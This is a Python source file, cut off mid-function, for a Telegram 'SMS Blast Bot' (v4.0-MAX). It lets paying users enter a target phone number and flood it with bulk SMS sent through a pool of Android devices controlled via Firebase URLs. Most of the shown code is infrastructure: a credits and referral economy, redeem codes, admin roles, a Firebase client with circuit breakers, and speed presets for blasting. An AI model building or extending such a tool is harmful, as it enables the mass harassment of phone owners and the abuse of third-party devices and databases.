"""
SMS Blast Bot — v4.0-MAX
Original: v3.2-PREMIUM (unchanged core)
Added: welcome video, auto-backup, live monitoring, user records, colored panels,
       circuit breakers, async JSON cache, feature detection, activity tracking.
"""
import asyncio, json, os, time, logging, random, string, io, re, signal, shutil, tempfile
from datetime import datetime, timedelta
from collections import defaultdict
from typing import Optional, Callable, Any

import aiohttp
from aiohttp import ClientTimeout, TCPConnector

from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ChatMemberUpdated,
    FSInputFile, BufferedInputFile,
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter


# ═══════════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("BlastBot")


# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════
MAIN_OWNER = 8695946179
SUPER_ADMIN_NAME = "@sahilxalone"
SUPER_ADMIN_LINK = "https://t.me/sahilxalone"
SUPER_ADMINS = [8695946179]

BOT_TOKEN = ""
LOG_CHANNEL_ID = -1003978116236

_DATA_FILE = "bla1st_data.json"
_VERSION = "v4.0-MAX"

_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0
_FORCE_JOIN_CACHE_TTL = 300.0
_BLAST_SAVE_INTERVAL = 5.0
_SAVE_DEBOUNCE_SEC = 0.15
_HTTP_TOTAL_TIMEOUT = 10
_HTTP_CONNECTOR_LIMIT = 200

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM


# ═══════════════════════════════════════════════════════════════════════
# EMOJI + TEXT
# ═══════════════════════════════════════════════════════════════════════
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

_SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789",
)

def sc(text: str) -> str:
    return text.translate(_SMALL_CAPS_MAP)

def escape(s: Any) -> str:
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

# feature detection for older aiogram versions
try:
    _ = InlineKeyboardButton(text="x", callback_data="x", style="primary")
    _HAS_STYLE = True
except TypeError:
    _HAS_STYLE = False

try:
    _HAS_ICON = "icon_custom_emoji_id" in InlineKeyboardButton.model_fields
except Exception:
    _HAS_ICON = False

def _apply_style(kwargs: dict, style: Optional[str]):
    if _HAS_STYLE and style in ("primary", "success", "danger"):
        kwargs["style"] = style
    return kwargs

def btn(text: str, callback_data: str, emoji_id: str = None,
        fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs: dict = {"text": label, "callback_data": callback_data}
    if emoji_id and _HAS_ICON:
        kwargs["icon_custom_emoji_id"] = emoji_id
    _apply_style(kwargs, style)
    return InlineKeyboardButton(**kwargs)

def btn_url(text: str, url: str, emoji_id: str = None,
            fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs: dict = {"text": label, "url": url}
    if emoji_id and _HAS_ICON:
        kwargs["icon_custom_emoji_id"] = emoji_id
    _apply_style(kwargs, style)
    return InlineKeyboardButton(**kwargs)

def style_btn(text: str, style: str = "primary",
              request_contact: bool = False,
              request_location: bool = False) -> KeyboardButton:
    kwargs: dict = {
        "text": sc(text),
        "request_contact": request_contact,
        "request_location": request_location,
    }
    if _HAS_STYLE and style in ("primary", "success", "danger"):
        kwargs["style"] = style
    return KeyboardButton(**kwargs)

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")],
        ],
        resize_keyboard=True,
    )


# ═══════════════════════════════════════════════════════════════════════
# SHARED HTTP SESSION
# ═══════════════════════════════════════════════════════════════════════
_HTTP_SESSION: Optional[aiohttp.ClientSession] = None

def http() -> aiohttp.ClientSession:
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        _HTTP_SESSION = aiohttp.ClientSession(
            timeout=ClientTimeout(total=_HTTP_TOTAL_TIMEOUT),
            connector=TCPConnector(limit=_HTTP_CONNECTOR_LIMIT, limit_per_host=50),
            trust_env=True,
        )
    return _HTTP_SESSION

async def close_http():
    global _HTTP_SESSION
    if _HTTP_SESSION and not _HTTP_SESSION.closed:
        await _HTTP_SESSION.close()
    _HTTP_SESSION = None


# ═══════════════════════════════════════════════════════════════════════
# DATA STORE
# ═══════════════════════════════════════════════════════════════════════
_DATA_CACHE: Optional[dict] = None
_DATA_DIRTY = False
_SAVE_TASK: Optional[asyncio.Task] = None
_SAVE_LOCK: Optional[asyncio.Lock] = None

def _get_save_lock() -> asyncio.Lock:
    global _SAVE_LOCK
    if _SAVE_LOCK is None:
        _SAVE_LOCK = asyncio.Lock()
    return _SAVE_LOCK

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "welcome_video": None,
        "backup": {
            "enabled": False, "chat_id": None, "chat_title": None,
            "times": [], "last_sent": 0, "last_status": None, "history": [],
        },
        "dau_log": {},
    }

def _migrate(d: dict) -> dict:
    defaults = _default_data()
    for k, v in defaults.items():
        if k not in d:
            d[k] = v
    if MAIN_OWNER not in d.get("owners", []):
        d["owners"].insert(0, MAIN_OWNER)
    for _uid, u in d.get("users", {}).items():
        u.setdefault("credits", 0)
        u.setdefault("sms_history", [])
        u.setdefault("manual_added_credits", 0)
        u.setdefault("last_active", 0)
    return d

def _load_sync() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                return _migrate(json.load(f))
        except Exception as e:
            log.error(f"load failure: {e}")
    d = _default_data()
    _save_sync(d)
    return d

def _save_sync(d: dict):
    try:
        d["protected_numbers"] = PROTECTED_NUMBERS
        fd, tmp = tempfile.mkstemp(dir=".", prefix=".bla1st_", suffix=".json")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(d, f, indent=2, ensure_ascii=False)
            os.replace(tmp, _DATA_FILE)
        except Exception:
            try: os.unlink(tmp)
            except Exception: pass
            raise
    except Exception as e:
        log.error(f"save failure: {e}")

def load() -> dict:
    global _DATA_CACHE
    if _DATA_CACHE is None:
        _DATA_CACHE = _load_sync()
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = _DATA_CACHE.get("protected_numbers", {})
    return _DATA_CACHE

def save(d: dict):
    global _DATA_CACHE, _DATA_DIRTY, _SAVE_TASK
    _DATA_CACHE = d
    _DATA_DIRTY = True
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        _save_sync(d)
        _DATA_DIRTY = False
        return
    if _SAVE_TASK is None or _SAVE_TASK.done():
        _SAVE_TASK = loop.create_task(_debounced_flush())

async def _debounced_flush():
    global _DATA_DIRTY
    try:
        await asyncio.sleep(_SAVE_DEBOUNCE_SEC)
        if not _DATA_DIRTY or _DATA_CACHE is None:
            return
        async with _get_save_lock():
            if not _DATA_DIRTY:
                return
            _DATA_DIRTY = False
            await asyncio.to_thread(_save_sync, _DATA_CACHE)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        log.error(f"debounced flush failed: {e}")

def save_now(d: dict):
    global _DATA_DIRTY, _DATA_CACHE
    _DATA_CACHE = d
    _DATA_DIRTY = False
    _save_sync(d)

def atomic_update(mutate_fn: Callable[[dict], Any], flush_immediately: bool = True) -> Any:
    d = load()
    result = mutate_fn(d)
    if flush_immediately:
        save_now(d)
    else:
        save(d)
    return result


# ═══════════════════════════════════════════════════════════════════════
# CIRCUIT BREAKER
# ═══════════════════════════════════════════════════════════════════════
class CircuitBreaker:
    __slots__ = ("name", "fail_threshold", "reset_after", "_fails", "_opened_at")
    def __init__(self, name: str, fail_threshold: int = 5, reset_after: float = 30.0):
        self.name = name
        self.fail_threshold = fail_threshold
        self.reset_after = reset_after
        self._fails = 0
        self._opened_at = 0.0
    def is_open(self) -> bool:
        if self._opened_at == 0.0:
            return False
        if time.time() - self._opened_at >= self.reset_after:
            self._opened_at = 0.0
            self._fails = 0
            return False
        return True
    def record_success(self):
        self._fails = 0
        self._opened_at = 0.0
    def record_failure(self):
        self._fails += 1
        if self._fails >= self.fail_threshold:
            self._opened_at = time.time()

_BREAKERS: dict[str, CircuitBreaker] = {}
def breaker_for(key: str) -> CircuitBreaker:
    cb = _BREAKERS.get(key)
    if cb is None:
        cb = CircuitBreaker(key)
        _BREAKERS[key] = cb
    return cb


# ═══════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, per_sec: int = 25):
        self._per = per_sec
        self._times: list[float] = []
    async def wait(self):
        now = time.time()
        self._times = [t for t in self._times if now - t < 1.0]
        if len(self._times) >= self._per:
            s = 1.0 - (now - self._times[0])
            if s > 0: await asyncio.sleep(s)
        self._times.append(time.time())

_TG_LIMITER = RateLimiter(per_sec=25)

async def safe_send(bot: Bot, chat_id: int, text: str, **kwargs):
    await _TG_LIMITER.wait()
    try:
        return await bot.send_message(chat_id, text, **kwargs)
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        return await bot.send_message(chat_id, text, **kwargs)


# ═══════════════════════════════════════════════════════════════════════
# FIREBASE CLIENT
# ═══════════════════════════════════════════════════════════════════════
async def fb_get(base_url: str, path: str) -> dict:
    cb = breaker_for(base_url)
    if cb.is_open():
        return {}
    url = base_url.rstrip("/") + path
    try:
        async with http().get(url) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                cb.record_success()
                if txt == "null" or not txt:
                    return {}
                return json.loads(txt)
            cb.record_failure()
    except Exception as e:
        cb.record_failure()
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict, retries: int = 3) -> bool:
    cb = breaker_for(base_url)
    if cb.is_open():
        return False
    url = base_url.rstrip("/") + path
    backoff = 0.4
    for attempt in range(retries):
        try:
            async with http().put(url, json=payload) as r:
                if 200 <= r.status < 300:
                    cb.record_success()
                    return True
                if 400 <= r.status < 500 and r.status != 429:
                    cb.record_failure()
                    return False
        except Exception as e:
            log.warning(f"fb_put {attempt+1}: {e}")
            cb.record_failure()
            if cb.is_open():
                return False
        await asyncio.sleep(backoff)
        backoff *= 2
    return False


# ═══════════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════════
class UserSession:
    __slots__ = ("uid", "cancelled", "sent", "failed", "task",
                 "start_time", "lock", "number", "blast_data")
    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task: Optional[asyncio.Task] = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number: Optional[str] = None
        self.blast_data: Optional[dict] = None

USER_SESSIONS: dict[int, UserSession] = {}
SESSIONS_LOCK = asyncio.Lock()

CACHED_DEVICES: list[dict] = []
LAST_SCAN_TIME = 0.0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG: list[dict] = []
FB_DEVICE_COUNTS: dict[str, dict] = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: dict[str, int] = {}

_FJ_CACHE: dict[tuple, tuple] = {}
_BACKUP_TASK: Optional[asyncio.Task] = None
_BACKUP_LAST_FIRED: dict[str, str] = {}


# ═══════════════════════════════════════════════════════════════════════
# FSM STATES
# ═══════════════════════════════════════════════════════════════════════
class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    add_media_spoiler_confirm = State()
    # NEW states
    bcast_text = State()
    bcast_button = State()
    welcome_video_add = State()
    welcome_video_spoiler = State()
    users_search = State()
    backup_chat = State()
    backup_times = State()


# ═══════════════════════════════════════════════════════════════════════
# ACTIVITY + STORAGE HELPERS
# ═══════════════════════════════════════════════════════════════════════
def touch_user_activity(uid: int):
    today = datetime.now().strftime("%Y-%m-%d")
    def _t(d):
        k = str(uid)
        if k not in d.get("users", {}): return
        u = d["users"][k]
        prev = u.get("last_active", 0)
        u["last_active"] = int(time.time())
        prev_day = datetime.fromtimestamp(prev).strftime("%Y-%m-%d") if prev else ""
        if prev_day != today:
            dl = d.setdefault("dau_log", {})
            dl[today] = dl.get(today, 0) + 1
    atomic_update(_t, flush_immediately=False)

def _human_bytes(n: int) -> str:
    if n < 1024: return f"{n} B"
    if n < 1024 ** 2: return f"{n/1024:.1f} KB"
    if n < 1024 ** 3: return f"{n/1024**2:.2f} MB"
    return f"{n/1024**3:.2f} GB"

def get_storage_stats() -> dict:
    data_bytes = os.path.getsize(_DATA_FILE) if os.path.exists(_DATA_FILE) else 0
    backup_bytes = 0
    backup_count = 0
    if os.path.isdir("backups"):
        for f in os.listdir("backups"):
            p = os.path.join("backups", f)
            if os.path.isfile(p):
                backup_bytes += os.path.getsize(p)
                backup_count += 1
    return {
        "data": data_bytes, "backup": backup_bytes,
        "backup_count": backup_count,
        "total": data_bytes + backup_bytes,
    }

def get_dau_stats(d: dict) -> dict:
    dau_log = d.get("dau_log", {})
    today = datetime.now().strftime("%Y-%m-%d")
    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    week_ago = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
    users = d.get("users", {})
    now = int(time.time())
    return {
        "today": dau_log.get(today, 0),
        "yesterday": dau_log.get(yesterday, 0),
        "week_total": sum(v for k, v in dau_log.items() if k >= week_ago),
        "total_users": len(users),
        "active_now": sum(1 for u in users.values() if now - u.get("last_active", 0) < 3600),
        "active_24h": sum(1 for u in users.values() if now - u.get("last_active", 0) < 86400),
        "log": dau_log,
    }


# ═══════════════════════════════════════════════════════════════════════
# USER / PERMISSION HELPERS
# ═══════════════════════════════════════════════════════════════════════
def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "manual_added_credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": [], "last_active": int(time.time()),
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid,
        "action": action, "details": details,
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool: return uid == MAIN_OWNER
def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS
def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])
def is_banned(uid: int, d: dict) -> bool: return uid in d.get("banned", [])
def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict, is_manual: bool = False):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "manual_added_credits": 0}
    d["users"][k].setdefault("manual_added_credits", 0)
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    if is_manual:
        d["users"][k]["manual_added_credits"] += amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("credits", 0) >= amount:
            d["users"][k]["credits"] -= amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if not any(u.get("refer_code") == code for u in d.get("users", {}).values()):
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer = None
    for uid_str, ud in d.get("users", {}).items():
        if ud.get("refer_code") == code:
            referrer = int(uid_str); break
    if not referrer:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    rc = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, rc, d)
    add_credits(referrer, rc, d)
    d["users"][str(new_uid)]["referred_by"] = referrer
    save_now(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {rc} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer


# ═══════════════════════════════════════════════════════════════════════
# WELCOME VIDEO
# ═══════════════════════════════════════════════════════════════════════
def get_welcome_video(d: dict) -> Optional[dict]:
    wv = d.get("welcome_video")
    if not wv: return None
    if isinstance(wv, dict):
        return wv if wv.get("file_id") else None
    return {"type": "video", "file_id": wv, "spoiler": False}

def welcome_text(uid: int, d: dict, is_new: bool) -> str:
    dev = "<a href='https://t.me/flirts_x'>ㅤ⏤͟͟͞͞𝗙ʟɪʀᴛ𝗫ᴏ</a>"
    loop = em("5465270065102334742", "➿") * 12
    new_line = (
        f"\n{em(EMOJI_GIFT, '🎁')} <b>Welcome aboard!</b> "
        f"<i>aapka account create ho gaya hai.</i>\n"
    ) if is_new else ""
    return (
        f"<blockquote>"
        f"{loop}{em(EMOJI_PHONE, '📱')} <b>SMS Blast Bot {_VERSION}</b>\n"
        f"owner · {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_ROCKET, '🚀')} <b>What this bot does</b>\n"
        f"send bulk sms through firebase-connected android devices — "
        f"fast, credit-based, per-user sessions.\n\n"
        f"{em(EMOJI_STAR, '✨')} <b>features</b>\n"
        f"  {em(EMOJI_CHECK, '✅')} multi-firebase device pool\n"
        f"  {em(EMOJI_CHECK, '✅')} live progress + stop anytime\n"
        f"  {em(EMOJI_CHECK, '✅')} credits system + referral rewards\n"
        f"  {em(EMOJI_CHECK, '✅')} redeem codes + pricing plans\n"
        f"  {em(EMOJI_CHECK, '✅')} sms history & user dashboard\n\n"
        f"{em(EMOJI_MONEY, '💡')} <b>how to start</b>\n"
        f"  1. tap <b>{sc('send sms')}</b> below\n"
        f"  2. enter target number\n"
        f"  3. type message + pick speed\n"
        f"  4. blast {em(EMOJI_FIRE, '🔥')}\n"
        f"{new_line}\n"
        f"{em(EMOJI_SHIELD, '🛡')} <i>respect telegram tos, no spam on protected numbers.</i>\n"
        f"ᴅᴇᴠ · {dev}"
        f"</blockquote>"
    )

async def send_welcome(bot: Bot, chat_id: int, d: dict, uid: int, is_new: bool):
    text = welcome_text(uid, d, is_new)
    markup = user_kb()
    wv = get_welcome_video(d)
    if wv:
        try:
            if wv.get("type") == "photo":
                await bot.send_photo(chat_id, photo=wv["file_id"], caption=text,
                                     parse_mode="HTML", reply_markup=markup,
                                     has_spoiler=bool(wv.get("spoiler", False)))
            else:
                await bot.send_video(chat_id, video=wv["file_id"], caption=text,
                                     parse_mode="HTML", reply_markup=markup,
                                     has_spoiler=bool(wv.get("spoiler", False)))
            return
        except Exception as e:
            log.warning(f"welcome video failed, fallback: {e}")
    await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# TELEGRAM SEND HELPERS
# ═══════════════════════════════════════════════════════════════════════
async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        async with http().post(url, json={"chat_id": chat_id, "text": "🔥",
                                          "message_effect_id": FIRE_EFFECT_ID}) as resp:
            res = await resp.json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
                await asyncio.sleep(2)
                durl = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                await http().post(durl, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"fire effect failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await safe_send(bot, LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"channel log failed: {e}")

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if not videos: return
    item = random.choice(videos)
    if isinstance(item, dict):
        mtype = item.get("type", "video")
        fid = item.get("file_id")
        sp = bool(item.get("spoiler", False))
    else:
        mtype, fid, sp = "video", item, False
    if not fid: return
    try:
        if mtype == "photo":
            await bot.send_photo(chat_id, photo=fid, caption=caption,
                                 parse_mode="HTML", has_spoiler=sp)
        else:
            await bot.send_video(chat_id, video=fid, caption=caption,
                                 parse_mode="HTML", has_spoiler=sp)
    except Exception as e:
        log.error(f"random media failed: {e}")

async def send_media_with_caption(bot: Bot, chat_id: int, d: dict, text: str, markup):
    videos = d.get("videos", [])
    visible_len = len(re.sub(r"<[^>]+>", "", text))
    if videos and visible_len <= 1000:
        item = random.choice(videos)
        if isinstance(item, dict):
            mtype = item.get("type", "video")
            fid = item.get("file_id")
            sp = bool(item.get("spoiler", False))
        else:
            mtype, fid, sp = "video", item, False
        try:
            if mtype == "photo":
                await bot.send_photo(chat_id, photo=fid, caption=text,
                                     parse_mode="HTML", reply_markup=markup, has_spoiler=sp)
            else:
                await bot.send_video(chat_id, video=fid, caption=text,
                                     parse_mode="HTML", reply_markup=markup, has_spoiler=sp)
            return
        except Exception as e:
            log.error(f"media send failed: {e}")
    await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

async def safe_edit(message, text, reply_markup=None, parse_mode="HTML", **kwargs):
    try:
        return await message.edit_text(text, reply_markup=reply_markup,
                                       parse_mode=parse_mode, **kwargs)
    except TelegramBadRequest:
        kwargs.pop("disable_web_page_preview", None)
        return await message.edit_caption(caption=text, reply_markup=reply_markup,
                                          parse_mode=parse_mode, **kwargs)


# ═══════════════════════════════════════════════════════════════════════
# UI BUILDERS
# ═══════════════════════════════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
    ])

def progress_bar(cur: int, total: int, width: int = 20) -> str:
    if total <= 0: return "░" * width
    filled = min(width, int(width * cur / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent, failed, total, credits=None, speed_label="⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    pct = int(((sent + failed) / total) * 100) if total else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{pct}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent+failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def progress_text_v2(sent, failed, total, credits=None, speed_label="⚡",
                     elapsed=0.0, per_fb=None) -> str:
    done = sent + failed
    bar = progress_bar(done, total)
    pct = int((done / total) * 100) if total else 0
    rate = done / elapsed if elapsed > 0.5 else 0
    eta = int((total - done) / rate) if rate > 0 else 0
    eta_str = f"{eta}s" if eta < 60 else f"{eta//60}m {eta%60}s"
    lines = [
        f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('blasting')}</b>  ·  {pct}%",
        f"{bar}\n",
        f"✅ <b>{sent}</b>   ❌ <b>{failed}</b>   📊 <b>{done}/{total}</b>",
        f"⚡ {speed_label}  ·  ETA ~<b>{eta_str}</b>",
    ]
    if credits is not None:
        lines.append(f"💳 left: <b>{credits}</b>  (used {done})")
    if per_fb:
        lines.append("")
        for label, st in list(per_fb.items())[:3]:
            lines.append(f"🔥 {escape(label[:16])}: {st['sent']}✓ {st['failed']}✗")
    lines.append(f"\n<i>🛑 Stop dabayein rokne ke liye.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
